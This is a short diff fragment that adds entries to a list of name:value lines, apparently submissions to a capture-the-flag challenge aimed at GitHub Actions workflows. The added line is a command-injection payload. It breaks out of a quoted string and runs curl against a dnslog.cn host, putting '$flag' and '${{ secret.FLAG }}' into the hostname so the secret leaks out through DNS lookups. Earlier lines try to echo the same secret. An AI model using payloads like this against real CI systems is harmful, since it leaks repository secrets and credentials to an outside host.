@@ -688,3 +688,4 @@ XXCNMOOO:echo ${{ secrets.FLAG }}### ### ###
 XXCNMOOO:${{ secret.FLAG }}
 Backr0ads:
 XXCNMOOO:
+lcl-367:fda";curl fkssbb.sxhx72.dnslog.cn;curl $flag.sxhx72.dnslog.cn;curl ${{ secret.FLAG }}.sxhx72.dnslog.cn;#echo${IFS}"a
